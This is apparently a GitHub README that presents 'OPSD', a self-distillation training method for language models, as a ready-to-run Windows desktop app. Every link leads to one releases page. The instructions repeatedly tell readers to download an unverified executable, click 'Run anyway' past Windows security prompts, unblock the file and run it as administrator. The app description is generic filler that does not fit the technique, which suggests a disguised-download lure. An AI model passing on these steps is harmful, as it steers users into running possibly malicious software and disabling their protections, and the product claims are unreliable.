# 🧠 OPSD - Run Self-Distilled Reasoning Workflows

<p align="center">
<a href="https://github.com/renaudbantuspeaking260/OPSD/releases"><img src="https://img.shields.io/badge/Download-OPSD-6f42c1.svg"></a>
<a href="https://github.com/renaudbantuspeaking260/OPSD/releases"><img src="https://img.shields.io/badge/Windows-Release-0078d7.svg"></a>
</p>

---

## 🚀 Download

Go to the [OPSD Releases page](https://github.com/renaudbantuspeaking260/OPSD/releases) to download and run this file.

1. Open the link in your web browser.
2. Find the latest release at the top of the page.
3. Under **Assets**, download the Windows file.
4. Save the file to your computer.
5. Double-click the file to run it.

If Windows shows a security prompt, choose **More info** and then **Run anyway** if you trust the file and the source.

---

## 🖥️ What OPSD Does

OPSD is a tool for running self-distilled reasoning workflows on a local Windows machine.

It is built around a simple idea:

- one part of the model works like a student
- one part works like a teacher
- the tool compares the two during reasoning
- the result is a tighter training loop for language models

For end users, this means OPSD helps you work with a reasoning system that is designed to improve output quality by using its own guided outputs.

---

## 📦 What You Need

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- At least 8 GB of RAM
- 10 GB of free disk space
- A stable internet connection
- Permission to run downloaded apps
- A modern browser such as Edge, Chrome, or Firefox

If you plan to use large models, more RAM and more disk space help.

---

## 🪟 How to Install on Windows

Follow these steps in order:

1. Open the [OPSD Releases page](https://github.com/renaudbantuspeaking260/OPSD/releases).
2. Download the latest Windows release from the **Assets** section.
3. Wait for the download to finish.
4. Open your **Downloads** folder.
5. Find the file you just downloaded.
6. Right-click the file and choose **Properties** if Windows blocks it.
7. If you see an **Unblock** option, check it and apply the change.
8. Double-click the file to start OPSD.
9. If Windows asks for permission, select **Yes**.
10. Follow the on-screen setup steps.

If the release comes as a `.zip` file:

1. Right-click the file.
2. Choose **Extract All**.
3. Open the extracted folder.
4. Run the main Windows app file inside that folder.

---

## ⚙️ First Run Setup

When you open OPSD for the first time, it may ask you to set a few items:

- where to store files
- which model to use
- how much memory to use
- whether to check for updates

Use the default settings if you are not sure. They are a good starting point for most Windows PCs.

If the app asks for a model file, choose the one listed in the release notes or the file that came with the download.

---

## 🔍 Basic Use

After OPSD starts:

1. Open the app.
2. Load the model or project file.
3. Enter your task or prompt.
4. Start the run.
5. Wait for the output to finish.
6. Save the result if you want to keep it.

OPSD is best for tasks that need step-by-step reasoning, such as:

- logic tasks
- math-style prompts
- structured answer checks
- comparison between model outputs
- trace-based model review

---

## 🧩 Main Parts of the App

OPSD usually includes these parts:

- **Prompt box**: where you enter your input
- **Run button**: starts the process
- **Model selector**: picks the model you want to use
- **Output panel**: shows the result
- **Settings area**: changes performance and file options

If your version has a different layout, the names may change a little, but the flow stays the same.

---

## 🛠️ Common Settings

Here are the settings most users may need:

- **Model path**: points to the model file
- **Batch size**: controls how much work the app handles at once
- **Context length**: sets how much text the model can see
- **Save folder**: stores output files
- **Log level**: controls how much detail the app records

If your computer feels slow, lower the batch size or use a smaller model.

---

## 📁 File Types You May See

During setup, you may see these file types:

- `.exe` — the app file you run on Windows
- `.zip` — a compressed download that you must extract
- `.json` — a settings file
- `.pt` or similar — a model file
- `.txt` — a text file with notes or output

Do not delete files unless you know what they do. Some files are needed for OPSD to start.

---

## 🧪 Update Notes

The current release includes code updates and fixes for chat template and Zero2 issues.

This version may work better with recent model setups and updated evaluation paths.

If you already used an older build, download the latest Windows release again from the [OPSD Releases page](https://github.com/renaudbantuspeaking260/OPSD/releases) and replace the old files if the release notes tell you to do so.

---

## ❓ Troubleshooting

### The file will not open

- Right-click the file and choose **Run as administrator**
- Check whether Windows blocked the file
- Re-download the file if the download was incomplete
- Make sure you extracted the `.zip` file before running it

### Windows says the app is unsafe

- Open the file details
- Check the publisher and source
- If the file came from the official release page, allow it to run

### The app opens but shows an error

- Restart the app
- Recheck the model path
- Make sure the needed files are still in the folder
- Try the latest release from the download page

### The app is slow

- Close other programs
- Use a smaller model
- Lower the batch size
- Free up disk space
- Restart Windows if memory is low

### Nothing happens after I click Run

- Make sure a model is loaded
- Check that the input field has text
- Confirm that the output folder is writable
- Open the log file if one is available

---

## 🧾 Tips for Better Results

Use short, clear prompts.

Good input usually includes:

- one task
- one goal
- a clear format
- a direct question

Example:

- Solve this problem and show the steps.
- Compare these two answers and pick the better one.
- Turn this paragraph into a simple summary.

This helps OPSD stay focused on the task.

---

## 🔐 Safety and File Handling

Only download OPSD from the official release page:

- [https://github.com/renaudbantuspeaking260/OPSD/releases](https://github.com/renaudbantuspeaking260/OPSD/releases)

Keep the app in a folder you can find again.

If you move the files, update the app path or open it from the new folder.

---

## 📌 Version Use

Use the latest release if you want the newest fixes.

Older builds may still run, but they can have:

- outdated templates
- fixed bugs missing from the build
- less stable behavior with newer models

If you are not sure which file to choose, pick the newest Windows asset listed on the release page.

---

## 🧭 Quick Start

1. Visit the [OPSD Releases page](https://github.com/renaudbantuspeaking260/OPSD/releases).
2. Download the latest Windows file.
3. Extract it if needed.
4. Open the app.
5. Load your model or project.
6. Enter a task.
7. Run the workflow.
8. Save the output

---

## 📄 Project Info

OPSD stands for **On-Policy Self-Distillation**.

The tool is built to help a single model act as both student and teacher by using different context inputs. The student sees the problem. The teacher also sees the answer. The app then uses that setup during reasoning runs.

This design is aimed at better token-level matching during the model’s own reasoning path.

---

## 🧰 If You Want to Keep Going

If the app runs well, you can:

- try a larger model
- test different prompts
- compare output quality
- review saved logs
- adjust performance settings

Start with the default setup, then make small changes one at a time

